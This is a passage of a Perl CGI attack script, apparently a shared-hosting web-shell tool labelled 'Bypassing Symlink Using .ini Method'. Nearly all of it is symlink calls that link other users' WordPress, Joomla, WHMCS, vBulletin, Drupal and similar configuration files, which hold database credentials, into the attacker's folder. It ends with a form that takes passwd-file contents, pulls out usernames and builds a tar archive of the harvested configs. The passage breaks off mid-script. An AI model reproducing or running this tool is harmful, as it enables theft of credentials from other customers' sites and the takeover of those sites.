 symlink('/home4/'.$user.'/public_html/protal/configuration.php',$domain.'~~>joomla-protal.ini');
 symlink('/home4/'.$user.'/public_html/joo/configuration.php',$domain.'~~>joomla-joo.ini');
 symlink('/home4/'.$user.'/public_html/cms/configuration.php',$domain.'~~>joomla-cms.ini');
 symlink('/home4/'.$user.'/public_html/site/configuration.php',$domain.'~~>joomla-site.ini');
 symlink('/home4/'.$user.'/public_html/main/configuration.php',$domain.'~~>joomla-main.ini');
 symlink('/home4/'.$user.'/public_html/news/configuration.php',$domain.'~~>joomla-news.ini');
 symlink('/home4/'.$user.'/public_html/new/configuration.php',$domain.'~~>joomla-new.ini');
 symlink('/home4/'.$user.'/public_html/home/configuration.php',$domain.'~~>joomla-home.ini');
 symlink('/home4/'.$user.'/public_html/forum/includes/config.php',$domain.'~~>VBulletin-forum.ini');
 symlink('/home4/'.$user.'/public_html/vb/includes/config.php',$domain.'~~>vb.ini');
 symlink('/home4/'.$user.'/public_html/vb3/includes/config.php',$domain.'~~>vb3.ini');
 symlink('/home4/'.$user.'/public_html/cpanel/configuration.php',$domain.'~~>cpanel.ini');
 symlink('/home4/'.$user.'/public_html/panel/configuration.php',$domain.'~~>panel.ini');
 symlink('/home4/'.$user.'/public_html/host/configuration.php',$domain.'~~>host.ini');
 symlink('/home4/'.$user.'/public_html/hosting/configuration.php',$domain.'~~>hosting.ini');
 symlink('/home4/'.$user.'/public_html/hosts/configuration.php',$domain.'~~>hosts.ini');
 symlink('/home4/'.$user.'/public_html/includes/dist-configure.php',$domain.'~~>zencart.ini'); 
 symlink('/home4/'.$user.'/public_html/zencart/includes/dist-configure.php',$domain.'~~>zencart-shop.ini'); 
 symlink('/home4/'.$user.'/public_html/shop/includes/dist-configure.php',$domain.'~~>shop-ZCshop.ini'); 
 symlink('/home4/'.$user.'/public_html/mk_conf.php',$pdomain.'~~>mk-portale1.ini');
 symlink('/home4/'.$user.'/public_html/Settings.php',$domain.'~~>smf.ini'); 
 symlink('/home4/'.$user.'/public_html/smf/Settings.php',$domain.'~~>smf-smf.ini'); 
 symlink('/home4/'.$user.'/public_html/forum/Settings.php',$domain.'~~>smf-forum.ini'); 
 symlink('/home4/'.$user.'/public_html/forums/Settings.php',$domain.'~~>smf-forums.ini'); 
 symlink('/home4/'.$user.'/public_html/upload/includes/config.php',$domain.'~~>upload.ini');
 symlink('/home4/'.$user.'/public_html/incl/config.php',$domain.'~~>malay.ini');
 symlink('/home4/'.$user.'/public_html/clientes/configuration.php',$domain.'~~>clents.ini');
 symlink('/home4/'.$user.'/public_html/cliente/configuration.php',$domain.'~~>client2.ini');
 symlink('/home4/'.$user.'/public_html/clientsupport/configuration.php',$domain.'~~>client.ini');
 symlink('/home4/'.$user.'/public_html/config/koneksi.php',$domain.'~~>lokomedia.ini');
 symlink('/home4/'.$user.'/public_html/admin/config.php',$domain.'~~>webconfig.ini');
 symlink('/home4/'.$user.'/public_html/admin/conf.php',$domain.'~~>webconfig2.ini');
 symlink('/home4/'.$user.'/public_html/system/sistem.php',$domain.'~~>lokomedia1.ini'); 
 symlink('/home4/'.$user.'/system/sistem.php',$domain.'~~>lokomedia.ini');
 symlink('/home4/'.$user.'/public_html/sites/default/settings.php',$domain.'~>Drupal.ini');
 symlink('/home4/'.$user.'/public_html/e107_config.php',$domain.'~>e107.ini');
 symlink('/home4/'.$user.'/public_html/datas/config.php',$domain.'~>Seditio.ini');
 symlink('/home5/'.$user.'/public_html/SSI.php',$domain.'~~>CMF.ini') ; 
 symlink('/home5/'.$user.'/public_html/forum/SSI.php',$domain.'~~>CMF-forum.ini') ; 
 symlink('/home5/'.$user.'/public_html/inc/config.php',$domain.'~~>MyBB.ini') ;
 symlink('/home5/'.$user.'/public_html/forum/inc/config.php',$domain.'~~>MyBB-forum.ini') ;
 symlink('/home5/'.$user.'/public_html/config.php',$domain.'~~>Other.ini') ;
 symlink('/home5/'.$user.'/public_html/conf_global.php',$domain.'~~>invisio.ini');
 symlink('/home5/'.$user.'/public_html/lib/config.php',$domain.'~~>Balitbang.ini') ;
 symlink('/home5/'.$user.'/public_html/client/configuration.php',$domain.'~~>clients.ini') ; 
 symlink('/home5/'.$user.'/public_html/clients/configuration.php',$domain.'~~>client.ini') ; 
 symlink('/home5/'.$user.'/public_html/billing/configuration.php',$domain.'~~>billing.ini') ; 
 symlink('/home5/'.$user.'/public_html/billings/configuration.php',$domain.'~~>billings.ini') ;
 symlink('/home5/'.$user.'/public_html/forum/config.php',$domain.'~~>PhpBB-forum.ini') ;
 symlink('/home5/'.$user.'/public_html/includes/functions.php',$domain.'~~>phpbb3.ini');
 symlink('/home5/'.$user.'/public_html/whmcs/configuration.php',$domain.'~~>whmcs.ini') ; 
 symlink('/home5/'.$user.'/public_html/whm/configuration.php',$domain.'~~>whm.ini');
 symlink('/home5/'.$user.'/public_html/whmc/configuration.php',$domain.'~~>whmc.ini');
 symlink('/home5/'.$user.'/public_html/submitticket.php',$domain.'~~>whmcs2.ini');
 symlink('/home5/'.$user.'/public_html/manage/configuration.php',$domain.'~~>mangewhmcs.ini'); 
 symlink('/home5/'.$user.'/public_html/order/configuration.php',$domain.'~~>Whm9.ini');
 symlink('/home5/'.$user.'/public_html/myshop/configuration.php',$domain.'~~>myshop.ini'); 
 symlink('/home5/'.$user.'/public_html/support/configuration.php',$domain.'~~>support.ini');
 symlink('/home5/'.$user.'/public_html/supports/configuration.php',$domain.'~~>supports.ini');
 symlink('/home5/'.$user.'/public_html/oscommerce/includes/configure.php',$domain.'~~>oscommerce.ini');
 symlink('/home5/'.$user.'/public_html/oscommerces/includes/configure.php',$domain.'~~>oscommerces.ini');
 symlink('/home5/'.$user.'/public_html/shopping/includes/configure.php',$domain.'~~>shop-shopping.ini');
 symlink('/home5/'.$user.'/public_html/sale/includes/configure.php',$domain.'~~>sale.ini');
 symlink('/home5/'.$user.'/public_html/amember/config.inc.php',$domain.'~~>amember.ini');
 symlink('/home5/'.$user.'/public_html/config.inc.php',$domain.'~~>amember2.ini');
 symlink('/home5/'.$user.'/public_html/wp-config.php',$domain.'~~>wordpress.ini') ; 
 symlink('/home5/'.$user.'/public_html/wp/wp-config.php',$domain.'~~>wordpress-wp.ini');
 symlink('/home5/'.$user.'/public_html/wp/beta/wp-config.php',$domain.'~~>wordpress-wp-beta.ini');
 symlink('/home5/'.$user.'/public_html/beta/wp-config.php',$domain.'~~>wordpress-beta.ini');
 symlink('/home5/'.$user.'/public_html/press/wp-config.php',$domain.'~~>wp13-press.ini');
 symlink('/home5/'.$user.'/public_html/wordpress/wp-config.php',$domain.'~~>wordpress-wordpress.ini');
 symlink('/home5/'.$user.'/public_html/wordpress/beta/wp-config.php',$domain.'~~>wordpress-wordpress-beta.ini');
 symlink('/home5/'.$user.'/public_html/news/wp-config.php',$domain.'~~>wordpress-news.ini');
 symlink('/home5/'.$user.'/public_html/new/wp-config.php',$domain.'~~>wordpress-new.ini');
 symlink('/home5/'.$user.'/public_html/blog/wp-config.php',$domain.'~~>wordpress.ini') ; 
 symlink('/home5/'.$user.'/public_html/web/wp-config.php',$domain.'~~>wordpress-web.ini') ; 
 symlink('/home5/'.$user.'/public_html/blogs/wp-config.php',$domain.'~~>wordpress-blogs.ini');
 symlink('/home5/'.$user.'/public_html/home/wp-config.php',$domain.'~~>wordpress-home.ini');
 symlink('/home5/'.$user.'/public_html/protal/wp-config.php',$domain.'~~>wordpress-protal.ini');
 symlink('/home5/'.$user.'/public_html/site/wp-config.php',$domain.'~~>ordpress-site.ini');
 symlink('/home5/'.$user.'/public_html/main/wp-config.php',$domain.'~~>wordpress-main.ini');
 symlink('/home5/'.$user.'/public_html/test/wp-config.php',$domain.'~~>wordpress-test.ini');
 symlink('/home5/'.$user.'/public_html/beta/configuration.php',$domain.'~~>joomla.ini') ; 
 symlink('/home5/'.$user.'/public_html/configuration.php',$domain.'~~>joomla.shtml') ; 
 symlink('/home5/'.$user.'/public_html/home/configuration.php',$domain.'~~>joomla-home.ini') ;
 symlink('/home5/'.$user.'/public_html/joomla/configuration.php',$domain.'~~>joomla-joomla.ini');
 symlink('/home5/'.$user.'/public_html/protal/configuration.php',$domain.'~~>joomla-protal.ini');
 symlink('/home5/'.$user.'/public_html/joo/configuration.php',$domain.'~~>joomla-joo.ini');
 symlink('/home5/'.$user.'/public_html/cms/configuration.php',$domain.'~~>joomla-cms.ini');
 symlink('/home5/'.$user.'/public_html/site/configuration.php',$domain.'~~>joomla-site.ini');
 symlink('/home5/'.$user.'/public_html/main/configuration.php',$domain.'~~>joomla-main.ini');
 symlink('/home5/'.$user.'/public_html/news/configuration.php',$domain.'~~>joomla-news.ini');
 symlink('/home5/'.$user.'/public_html/new/configuration.php',$domain.'~~>joomla-new.ini');
 symlink('/home5/'.$user.'/public_html/home/configuration.php',$domain.'~~>joomla-home.ini');
 symlink('/home5/'.$user.'/public_html/forum/includes/config.php',$domain.'~~>VBulletin-forum.ini');
 symlink('/home5/'.$user.'/public_html/vb/includes/config.php',$domain.'~~>vb.ini');
 symlink('/home5/'.$user.'/public_html/vb3/includes/config.php',$domain.'~~>vb3.ini');
 symlink('/home5/'.$user.'/public_html/cpanel/configuration.php',$domain.'~~>cpanel.ini');
 symlink('/home5/'.$user.'/public_html/panel/configuration.php',$domain.'~~>panel.ini');
 symlink('/home5/'.$user.'/public_html/host/configuration.php',$domain.'~~>host.ini');
 symlink('/home5/'.$user.'/public_html/hosting/configuration.php',$domain.'~~>hosting.ini');
 symlink('/home5/'.$user.'/public_html/hosts/configuration.php',$domain.'~~>hosts.ini');
 symlink('/home5/'.$user.'/public_html/includes/dist-configure.php',$domain.'~~>zencart.ini'); 
 symlink('/home5/'.$user.'/public_html/zencart/includes/dist-configure.php',$domain.'~~>zencart-shop.ini'); 
 symlink('/home5/'.$user.'/public_html/shop/includes/dist-configure.php',$domain.'~~>shop-ZCshop.ini'); 
 symlink('/home5/'.$user.'/public_html/mk_conf.php',$pdomain.'~~>mk-portale1.ini');
 symlink('/home5/'.$user.'/public_html/Settings.php',$domain.'~~>smf.ini'); 
 symlink('/home5/'.$user.'/public_html/smf/Settings.php',$domain.'~~>smf-smf.ini'); 
 symlink('/home5/'.$user.'/public_html/forum/Settings.php',$domain.'~~>smf-forum.ini'); 
 symlink('/home5/'.$user.'/public_html/forums/Settings.php',$domain.'~~>smf-forums.ini'); 
 symlink('/home5/'.$user.'/public_html/upload/includes/config.php',$domain.'~~>upload.ini');
 symlink('/home5/'.$user.'/public_html/incl/config.php',$domain.'~~>malay.ini');
 symlink('/home5/'.$user.'/public_html/clientes/configuration.php',$domain.'~~>clents.ini');
 symlink('/home5/'.$user.'/public_html/cliente/configuration.php',$domain.'~~>client2.ini');
 symlink('/home5/'.$user.'/public_html/clientsupport/configuration.php',$domain.'~~>client.ini');
 symlink('/home5/'.$user.'/public_html/config/koneksi.php',$domain.'~~>lokomedia.ini');
 symlink('/home5/'.$user.'/public_html/admin/config.php',$domain.'~~>webconfig.ini');
 symlink('/home5/'.$user.'/public_html/admin/conf.php',$domain.'~~>webconfig2.ini');
 symlink('/home5/'.$user.'/public_html/system/sistem.php',$domain.'~~>lokomedia1.ini'); 
 symlink('/home5/'.$user.'/system/sistem.php',$domain.'~~>lokomedia.ini');
 symlink('/home5/'.$user.'/public_html/sites/default/settings.php',$domain.'~>Drupal.ini');
 symlink('/home5/'.$user.'/public_html/e107_config.php',$domain.'~>e107.ini');
 symlink('/home5/'.$user.'/public_html/datas/config.php',$domain.'~>Seditio.ini');
 symlink('/home6/'.$user.'/public_html/SSI.php',$domain.'~~>CMF.ini') ; 
 symlink('/home6/'.$user.'/public_html/forum/SSI.php',$domain.'~~>CMF-forum.ini') ; 
 symlink('/home6/'.$user.'/public_html/inc/config.php',$domain.'~~>MyBB.ini') ;
 symlink('/home6/'.$user.'/public_html/forum/inc/config.php',$domain.'~~>MyBB-forum.ini') ;
 symlink('/home6/'.$user.'/public_html/config.php',$domain.'~~>Other.ini') ;
 symlink('/home6/'.$user.'/public_html/conf_global.php',$domain.'~~>invisio.ini');
 symlink('/home6/'.$user.'/public_html/lib/config.php',$domain.'~~>Balitbang.ini') ;
 symlink('/home6/'.$user.'/public_html/client/configuration.php',$domain.'~~>clients.ini') ; 
 symlink('/home6/'.$user.'/public_html/clients/configuration.php',$domain.'~~>client.ini') ; 
 symlink('/home6/'.$user.'/public_html/billing/configuration.php',$domain.'~~>billing.ini') ; 
 symlink('/home6/'.$user.'/public_html/billings/configuration.php',$domain.'~~>billings.ini') ;
 symlink('/home6/'.$user.'/public_html/forum/config.php',$domain.'~~>PhpBB-forum.ini') ;
 symlink('/home6/'.$user.'/public_html/includes/functions.php',$domain.'~~>phpbb3.ini');
 symlink('/home6/'.$user.'/public_html/whmcs/configuration.php',$domain.'~~>whmcs.ini') ; 
 symlink('/home6/'.$user.'/public_html/whm/configuration.php',$domain.'~~>whm.ini');
 symlink('/home6/'.$user.'/public_html/whmc/configuration.php',$domain.'~~>whmc.ini');
 symlink('/home6/'.$user.'/public_html/submitticket.php',$domain.'~~>whmcs2.ini');
 symlink('/home6/'.$user.'/public_html/manage/configuration.php',$domain.'~~>mangewhmcs.ini'); 
 symlink('/home6/'.$user.'/public_html/order/configuration.php',$domain.'~~>Whm9.ini');
 symlink('/home6/'.$user.'/public_html/myshop/configuration.php',$domain.'~~>myshop.ini'); 
 symlink('/home6/'.$user.'/public_html/support/configuration.php',$domain.'~~>support.ini');
 symlink('/home6/'.$user.'/public_html/supports/configuration.php',$domain.'~~>supports.ini');
 symlink('/home6/'.$user.'/public_html/oscommerce/includes/configure.php',$domain.'~~>oscommerce.ini');
 symlink('/home6/'.$user.'/public_html/oscommerces/includes/configure.php',$domain.'~~>oscommerces.ini');
 symlink('/home6/'.$user.'/public_html/shopping/includes/configure.php',$domain.'~~>shop-shopping.ini');
 symlink('/home6/'.$user.'/public_html/sale/includes/configure.php',$domain.'~~>sale.ini');
 symlink('/home6/'.$user.'/public_html/amember/config.inc.php',$domain.'~~>amember.ini');
 symlink('/home6/'.$user.'/public_html/config.inc.php',$domain.'~~>amember2.ini');
 symlink('/home6/'.$user.'/public_html/wp-config.php',$domain.'~~>wordpress.ini') ; 
 symlink('/home6/'.$user.'/public_html/wp/wp-config.php',$domain.'~~>wordpress-wp.ini');
 symlink('/home6/'.$user.'/public_html/wp/beta/wp-config.php',$domain.'~~>wordpress-wp-beta.ini');
 symlink('/home6/'.$user.'/public_html/beta/wp-config.php',$domain.'~~>wordpress-beta.ini');
 symlink('/home6/'.$user.'/public_html/press/wp-config.php',$domain.'~~>wp13-press.ini');
 symlink('/home6/'.$user.'/public_html/wordpress/wp-config.php',$domain.'~~>wordpress-wordpress.ini');
 symlink('/home6/'.$user.'/public_html/wordpress/beta/wp-config.php',$domain.'~~>wordpress-wordpress-beta.ini');
 symlink('/home6/'.$user.'/public_html/news/wp-config.php',$domain.'~~>wordpress-news.ini');
 symlink('/home6/'.$user.'/public_html/new/wp-config.php',$domain.'~~>wordpress-new.ini');
 symlink('/home6/'.$user.'/public_html/blog/wp-config.php',$domain.'~~>wordpress.ini') ; 
 symlink('/home6/'.$user.'/public_html/web/wp-config.php',$domain.'~~>wordpress-web.ini') ; 
 symlink('/home6/'.$user.'/public_html/blogs/wp-config.php',$domain.'~~>wordpress-blogs.ini');
 symlink('/home6/'.$user.'/public_html/home/wp-config.php',$domain.'~~>wordpress-home.ini');
 symlink('/home6/'.$user.'/public_html/protal/wp-config.php',$domain.'~~>wordpress-protal.ini');
 symlink('/home6/'.$user.'/public_html/site/wp-config.php',$domain.'~~>ordpress-site.ini');
 symlink('/home6/'.$user.'/public_html/main/wp-config.php',$domain.'~~>wordpress-main.ini');
 symlink('/home6/'.$user.'/public_html/test/wp-config.php',$domain.'~~>wordpress-test.ini');
 symlink('/home6/'.$user.'/public_html/beta/configuration.php',$domain.'~~>joomla.ini') ; 
 symlink('/home6/'.$user.'/public_html/configuration.php',$domain.'~~>joomla.shtml') ; 
 symlink('/home6/'.$user.'/public_html/home/configuration.php',$domain.'~~>joomla-home.ini') ;
 symlink('/home6/'.$user.'/public_html/joomla/configuration.php',$domain.'~~>joomla-joomla.ini');
 symlink('/home6/'.$user.'/public_html/protal/configuration.php',$domain.'~~>joomla-protal.ini');
 symlink('/home6/'.$user.'/public_html/joo/configuration.php',$domain.'~~>joomla-joo.ini');
 symlink('/home6/'.$user.'/public_html/cms/configuration.php',$domain.'~~>joomla-cms.ini');
 symlink('/home6/'.$user.'/public_html/site/configuration.php',$domain.'~~>joomla-site.ini');
 symlink('/home6/'.$user.'/public_html/main/configuration.php',$domain.'~~>joomla-main.ini');
 symlink('/home6/'.$user.'/public_html/news/configuration.php',$domain.'~~>joomla-news.ini');
 symlink('/home6/'.$user.'/public_html/new/configuration.php',$domain.'~~>joomla-new.ini');
 symlink('/home6/'.$user.'/public_html/home/configuration.php',$domain.'~~>joomla-home.ini');
 symlink('/home6/'.$user.'/public_html/forum/includes/config.php',$domain.'~~>VBulletin-forum.ini');
 symlink('/home6/'.$user.'/public_html/vb/includes/config.php',$domain.'~~>vb.ini');
 symlink('/home6/'.$user.'/public_html/vb3/includes/config.php',$domain.'~~>vb3.ini');
 symlink('/home6/'.$user.'/public_html/cpanel/configuration.php',$domain.'~~>cpanel.ini');
 symlink('/home6/'.$user.'/public_html/panel/configuration.php',$domain.'~~>panel.ini');
 symlink('/home6/'.$user.'/public_html/host/configuration.php',$domain.'~~>host.ini');
 symlink('/home6/'.$user.'/public_html/hosting/configuration.php',$domain.'~~>hosting.ini');
 symlink('/home6/'.$user.'/public_html/hosts/configuration.php',$domain.'~~>hosts.ini');
 symlink('/home6/'.$user.'/public_html/includes/dist-configure.php',$domain.'~~>zencart.ini'); 
 symlink('/home6/'.$user.'/public_html/zencart/includes/dist-configure.php',$domain.'~~>zencart-shop.ini'); 
 symlink('/home6/'.$user.'/public_html/shop/includes/dist-configure.php',$domain.'~~>shop-ZCshop.ini'); 
 symlink('/home6/'.$user.'/public_html/mk_conf.php',$pdomain.'~~>mk-portale1.ini');
 symlink('/home6/'.$user.'/public_html/Settings.php',$domain.'~~>smf.ini'); 
 symlink('/home6/'.$user.'/public_html/smf/Settings.php',$domain.'~~>smf-smf.ini'); 
 symlink('/home6/'.$user.'/public_html/forum/Settings.php',$domain.'~~>smf-forum.ini'); 
 symlink('/home6/'.$user.'/public_html/forums/Settings.php',$domain.'~~>smf-forums.ini'); 
 symlink('/home6/'.$user.'/public_html/upload/includes/config.php',$domain.'~~>upload.ini');
 symlink('/home6/'.$user.'/public_html/incl/config.php',$domain.'~~>malay.ini');
 symlink('/home6/'.$user.'/public_html/clientes/configuration.php',$domain.'~~>clents.ini');
 symlink('/home6/'.$user.'/public_html/cliente/configuration.php',$domain.'~~>client2.ini');
 symlink('/home6/'.$user.'/public_html/clientsupport/configuration.php',$domain.'~~>client.ini');
 symlink('/home6/'.$user.'/public_html/config/koneksi.php',$domain.'~~>lokomedia.ini');
 symlink('/home6/'.$user.'/public_html/admin/config.php',$domain.'~~>webconfig.ini');
 symlink('/home6/'.$user.'/public_html/admin/conf.php',$domain.'~~>webconfig2.ini');
 symlink('/home6/'.$user.'/public_html/system/sistem.php',$domain.'~~>lokomedia1.ini'); 
 symlink('/home6/'.$user.'/system/sistem.php',$domain.'~~>lokomedia.ini');
 symlink('/home6/'.$user.'/public_html/sites/default/settings.php',$domain.'~>Drupal.ini');
 symlink('/home6/'.$user.'/public_html/e107_config.php',$domain.'~>e107.ini');
 symlink('/home6/'.$user.'/public_html/datas/config.php',$domain.'~>Seditio.ini');
 symlink('/home7/'.$user.'/public_html/SSI.php',$domain.'~~>CMF.ini') ; 
 symlink('/home7/'.$user.'/public_html/forum/SSI.php',$domain.'~~>CMF-forum.ini') ; 
 symlink('/home7/'.$user.'/public_html/inc/config.php',$domain.'~~>MyBB.ini') ;
 symlink('/home7/'.$user.'/public_html/forum/inc/config.php',$domain.'~~>MyBB-forum.ini') ;
 symlink('/home7/'.$user.'/public_html/config.php',$domain.'~~>Other.ini') ;
 symlink('/home7/'.$user.'/public_html/conf_global.php',$domain.'~~>invisio.ini');
 symlink('/home7/'.$user.'/public_html/lib/config.php',$domain.'~~>Balitbang.ini') ;
 symlink('/home7/'.$user.'/public_html/client/configuration.php',$domain.'~~>clients.ini') ; 
 symlink('/home7/'.$user.'/public_html/clients/configuration.php',$domain.'~~>client.ini') ; 
 symlink('/home7/'.$user.'/public_html/billing/configuration.php',$domain.'~~>billing.ini') ; 
 symlink('/home7/'.$user.'/public_html/billings/configuration.php',$domain.'~~>billings.ini') ;
 symlink('/home7/'.$user.'/public_html/forum/config.php',$domain.'~~>PhpBB-forum.ini') ;
 symlink('/home7/'.$user.'/public_html/includes/functions.php',$domain.'~~>phpbb3.ini');
 symlink('/home7/'.$user.'/public_html/whmcs/configuration.php',$domain.'~~>whmcs.ini') ; 
 symlink('/home7/'.$user.'/public_html/whm/configuration.php',$domain.'~~>whm.ini');
 symlink('/home7/'.$user.'/public_html/whmc/configuration.php',$domain.'~~>whmc.ini');
 symlink('/home7/'.$user.'/public_html/submitticket.php',$domain.'~~>whmcs2.ini');
 symlink('/home7/'.$user.'/public_html/manage/configuration.php',$domain.'~~>mangewhmcs.ini'); 
 symlink('/home7/'.$user.'/public_html/order/configuration.php',$domain.'~~>Whm9.ini');
 symlink('/home7/'.$user.'/public_html/myshop/configuration.php',$domain.'~~>myshop.ini'); 
 symlink('/home7/'.$user.'/public_html/support/configuration.php',$domain.'~~>support.ini');
 symlink('/home7/'.$user.'/public_html/supports/configuration.php',$domain.'~~>supports.ini');
 symlink('/home7/'.$user.'/public_html/oscommerce/includes/configure.php',$domain.'~~>oscommerce.ini');
 symlink('/home7/'.$user.'/public_html/oscommerces/includes/configure.php',$domain.'~~>oscommerces.ini');
 symlink('/home7/'.$user.'/public_html/shopping/includes/configure.php',$domain.'~~>shop-shopping.ini');
 symlink('/home7/'.$user.'/public_html/sale/includes/configure.php',$domain.'~~>sale.ini');
 symlink('/home7/'.$user.'/public_html/amember/config.inc.php',$domain.'~~>amember.ini');
 symlink('/home7/'.$user.'/public_html/config.inc.php',$domain.'~~>amember2.ini');
 symlink('/home7/'.$user.'/public_html/wp-config.php',$domain.'~~>wordpress.ini') ; 
 symlink('/home7/'.$user.'/public_html/wp/wp-config.php',$domain.'~~>wordpress-wp.ini');
 symlink('/home7/'.$user.'/public_html/wp/beta/wp-config.php',$domain.'~~>wordpress-wp-beta.ini');
 symlink('/home7/'.$user.'/public_html/beta/wp-config.php',$domain.'~~>wordpress-beta.ini');
 symlink('/home7/'.$user.'/public_html/press/wp-config.php',$domain.'~~>wp13-press.ini');
 symlink('/home7/'.$user.'/public_html/wordpress/wp-config.php',$domain.'~~>wordpress-wordpress.ini');
 symlink('/home7/'.$user.'/public_html/wordpress/beta/wp-config.php',$domain.'~~>wordpress-wordpress-beta.ini');
 symlink('/home7/'.$user.'/public_html/news/wp-config.php',$domain.'~~>wordpress-news.ini');
 symlink('/home7/'.$user.'/public_html/new/wp-config.php',$domain.'~~>wordpress-new.ini');
 symlink('/home7/'.$user.'/public_html/blog/wp-config.php',$domain.'~~>wordpress.ini') ; 
 symlink('/home7/'.$user.'/public_html/web/wp-config.php',$domain.'~~>wordpress-web.ini') ; 
 symlink('/home7/'.$user.'/public_html/blogs/wp-config.php',$domain.'~~>wordpress-blogs.ini');
 symlink('/home7/'.$user.'/public_html/home/wp-config.php',$domain.'~~>wordpress-home.ini');
 symlink('/home7/'.$user.'/public_html/protal/wp-config.php',$domain.'~~>wordpress-protal.ini');
 symlink('/home7/'.$user.'/public_html/site/wp-config.php',$domain.'~~>ordpress-site.ini');
 symlink('/home7/'.$user.'/public_html/main/wp-config.php',$domain.'~~>wordpress-main.ini');
 symlink('/home7/'.$user.'/public_html/test/wp-config.php',$domain.'~~>wordpress-test.ini');
 symlink('/home7/'.$user.'/public_html/beta/configuration.php',$domain.'~~>joomla.ini') ; 
 symlink('/home7/'.$user.'/public_html/configuration.php',$domain.'~~>joomla.shtml') ; 
 symlink('/home7/'.$user.'/public_html/home/configuration.php',$domain.'~~>joomla-home.ini') ;
 symlink('/home7/'.$user.'/public_html/joomla/configuration.php',$domain.'~~>joomla-joomla.ini');
 symlink('/home7/'.$user.'/public_html/protal/configuration.php',$domain.'~~>joomla-protal.ini');
 symlink('/home7/'.$user.'/public_html/joo/configuration.php',$domain.'~~>joomla-joo.ini');
 symlink('/home7/'.$user.'/public_html/cms/configuration.php',$domain.'~~>joomla-cms.ini');
 symlink('/home7/'.$user.'/public_html/site/configuration.php',$domain.'~~>joomla-site.ini');
 symlink('/home7/'.$user.'/public_html/main/configuration.php',$domain.'~~>joomla-main.ini');
 symlink('/home7/'.$user.'/public_html/news/configuration.php',$domain.'~~>joomla-news.ini');
 symlink('/home7/'.$user.'/public_html/new/configuration.php',$domain.'~~>joomla-new.ini');
 symlink('/home7/'.$user.'/public_html/home/configuration.php',$domain.'~~>joomla-home.ini');
 symlink('/home7/'.$user.'/public_html/forum/includes/config.php',$domain.'~~>VBulletin-forum.ini');
 symlink('/home7/'.$user.'/public_html/vb/includes/config.php',$domain.'~~>vb.ini');
 symlink('/home7/'.$user.'/public_html/vb3/includes/config.php',$domain.'~~>vb3.ini');
 symlink('/home7/'.$user.'/public_html/cpanel/configuration.php',$domain.'~~>cpanel.ini');
 symlink('/home7/'.$user.'/public_html/panel/configuration.php',$domain.'~~>panel.ini');
 symlink('/home7/'.$user.'/public_html/host/configuration.php',$domain.'~~>host.ini');
 symlink('/home7/'.$user.'/public_html/hosting/configuration.php',$domain.'~~>hosting.ini');
 symlink('/home7/'.$user.'/public_html/hosts/configuration.php',$domain.'~~>hosts.ini');
 symlink('/home7/'.$user.'/public_html/includes/dist-configure.php',$domain.'~~>zencart.ini'); 
 symlink('/home7/'.$user.'/public_html/zencart/includes/dist-configure.php',$domain.'~~>zencart-shop.ini'); 
 symlink('/home7/'.$user.'/public_html/shop/includes/dist-configure.php',$domain.'~~>shop-ZCshop.ini'); 
 symlink('/home7/'.$user.'/public_html/mk_conf.php',$pdomain.'~~>mk-portale1.ini');
 symlink('/home7/'.$user.'/public_html/Settings.php',$domain.'~~>smf.ini'); 
 symlink('/home7/'.$user.'/public_html/smf/Settings.php',$domain.'~~>smf-smf.ini'); 
 symlink('/home7/'.$user.'/public_html/forum/Settings.php',$domain.'~~>smf-forum.ini'); 
 symlink('/home7/'.$user.'/public_html/forums/Settings.php',$domain.'~~>smf-forums.ini'); 
 symlink('/home7/'.$user.'/public_html/upload/includes/config.php',$domain.'~~>upload.ini');
 symlink('/home7/'.$user.'/public_html/incl/config.php',$domain.'~~>malay.ini');
 symlink('/home7/'.$user.'/public_html/clientes/configuration.php',$domain.'~~>clents.ini');
 symlink('/home7/'.$user.'/public_html/cliente/configuration.php',$domain.'~~>client2.ini');
 symlink('/home7/'.$user.'/public_html/clientsupport/configuration.php',$domain.'~~>client.ini');
 symlink('/home7/'.$user.'/public_html/config/koneksi.php',$domain.'~~>lokomedia.ini');
 symlink('/home7/'.$user.'/public_html/admin/config.php',$domain.'~~>webconfig.ini');
 symlink('/home7/'.$user.'/public_html/admin/conf.php',$domain.'~~>webconfig2.ini');
 symlink('/home7/'.$user.'/public_html/system/sistem.php',$domain.'~~>lokomedia1.ini'); 
 symlink('/home7/'.$user.'/system/sistem.php',$domain.'~~>lokomedia.ini');
 symlink('/home7/'.$user.'/public_html/sites/default/settings.php',$domain.'~>Drupal.ini');
 symlink('/home7/'.$user.'/public_html/e107_config.php',$domain.'~>e107.ini');
 symlink('/home7/'.$user.'/public_html/datas/config.php',$domain.'~>Seditio.ini');
}
if ($ENV{'REQUEST_METHOD'} eq 'POST') {
  read(STDIN, $buffer, $ENV{'CONTENT_LENGTH'});
} else {
  $buffer = $ENV{'QUERY_STRING'};
}
@pairs = split(/&/, $buffer);
foreach $pair (@pairs) {
  ($name, $value) = split(/=/, $pair);
  $name =~ tr/+/ /;
  $name =~ s/%([a-fA-F0-9][a-fA-F0-9])/pack("C", hex($1))/eg;
  $value =~ tr/+/ /;
  $value =~ s/%([a-fA-F0-9][a-fA-F0-9])/pack("C", hex($1))/eg;
  $FORM{$name} = $value;
}
if ($FORM{pass} eq ""){
print '
<body class="newStyle1" bgcolor="#000000">
<p>Bypassing Symlink Using .ini Method </p>
<p><font color="#C0C0C0">[</font> Coded By <font color="#FF0000">X-1N73CT</font><font color="#C0C0C0">]</font>
<form method="post">
<textarea name="pass" style="border:1px dotted #00ff00; width: 543px; height: 420px; background-color:#0C0C0C; font-family:Tahoma; font-size:8pt; color:#FF0000"  ></textarea></p>
<p align="center">
<input name="tar" type="text" style="border:1px dotted #FF0000; width: 212px; background-color:#0C0C0C; font-family:Tahoma; font-size:8pt; color:#FF0000; "  /></p>
<p align="center">
<input name="Submit1" type="submit" value="GET CONFIG !" style="border:1px dotted #FF0000; width: 99; font-family:Tahoma; font-size:10pt; color:#59E817; text-transform:uppercase; height:23; background-color:#0C0C0C" /></p>
</form>';
}else{
@lines =<$FORM{pass}>;
$y = @lines;
open (MYFILE, ">tar.tmp");
print MYFILE "tar -czf ".$FORM{tar}.".tar ";
for ($ka=0;$ka<$y;$ka++){
while(@lines[$ka]  =~ m/(.*?):x:/g){
&lil($1);
print MYFILE $1.".txt ";
for($kd=1;$kd<18;$kd++){
print MYFILE $1.$kd.".txt ";
}
}
 }
print'<body class="newStyle1" bgcolor="#000000">
<p>You got it!!<br><br><br><font color="#C0C0C0">[</font> Coded By <font color="#FF0000">X-1N73CT</font><font color="#C0C0C0">]</font></p>
<p>&nbsp;</p>';
if($FORM{tar} ne ""){
open(INFO, "tar.tmp");
